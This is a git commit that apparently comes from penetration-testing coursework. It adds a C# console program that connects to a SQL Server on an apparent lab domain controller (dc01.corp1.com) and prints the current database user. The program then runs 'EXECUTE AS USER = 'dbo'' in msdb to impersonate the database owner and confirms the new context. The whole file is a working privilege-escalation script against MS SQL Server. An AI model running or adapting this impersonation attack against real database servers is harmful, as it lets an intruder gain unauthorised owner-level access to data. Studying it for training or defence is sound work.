56862853748c21138a9c1d8e06bfbc1cce846849
sirjan <sirja@ZIZKA>
2025-06-19 18:07:06 +0200

    Impersonation

---
+++ SQL/SQL/Program.cs
@@ -0,0 +1,66 @@
+﻿using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp1.com";
+            String database = "msdb";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            Console.WriteLine("Before impersonation:");
+            String querylogin = "SELECT USER_NAME();";
+            SqlCommand command = new SqlCommand(querylogin, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Executing in the context of: " + reader[0]);
+            reader.Close();
+
+            String executeas = "use msdb; EXECUTE AS USER = 'dbo';";
+
+            command = new SqlCommand(executeas, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            Console.WriteLine("After impersonation:");
+            querylogin = "SELECT USER_NAME();";
+            command = new SqlCommand(querylogin, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Executing in the context of: " + reader[0]);
+            reader.Close();
+
+            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
+            command = new SqlCommand(querypublicrole, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Int32 role = Int32.Parse(reader[0].ToString());
+            if (role == 1)
+            {
+                Console.WriteLine("User is a member of public role");
+            }
+            else
+            {
+                Console.WriteLine("User is NOT a member of public role");
+            }
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
